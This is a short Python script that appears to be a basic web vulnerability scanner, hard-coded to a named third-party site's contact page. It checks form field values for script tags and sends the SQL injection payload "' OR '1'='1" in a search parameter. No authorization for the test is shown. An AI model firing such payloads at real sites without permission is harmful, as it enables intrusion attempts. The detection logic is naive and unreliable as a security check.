import requests
from bs4 import BeautifulSoup
import re

# Define the URL of the website to test
url = 'https://bharatividyapeethfees.com/contactus.html'

def check_xss_vulnerability(url):
    # Send a request to the URL
    response = requests.get(url)

    # Parse the HTML content using BeautifulSoup
    soup = BeautifulSoup(response.text, 'html.parser')

    # Find all input fields and textarea elements
    input_fields = soup.find_all(['input', 'textarea'])

    # Check each input field for potential XSS vectors
    vulnerable_fields = []

    for field in input_fields:
        if 'name' in field.attrs and 'value' in field.attrs:
            input_name = field['name']
            input_value = field['value']

            # Check for XSS vectors in input value
            if re.search(r'<script[\s\S]*?>[\s\S]*?</script>', input_value):
                vulnerable_fields.append(input_name)

    if vulnerable_fields:
        print(f'XSS vulnerability found in fields: {", ".join(vulnerable_fields)} on {url}')
    else:
        print(f'No XSS vulnerability found in {url}')

def check_sql_injection_vulnerability(url):
    # Attempt to inject a simple SQL command
    payload = "' OR '1'='1"
    inject_url = f"{url}?search={payload}"
    response = requests.get(inject_url)

    # Check if the response indicates a successful injection (if the site is vulnerable)
    if 'Error in SQL syntax' in response.text:
        print(f'SQL Injection vulnerability found in {url}')
    else:
        print(f'No SQL Injection vulnerability found in {url}')

# Example usage:
check_xss_vulnerability(url)
check_sql_injection_vulnerability(url)
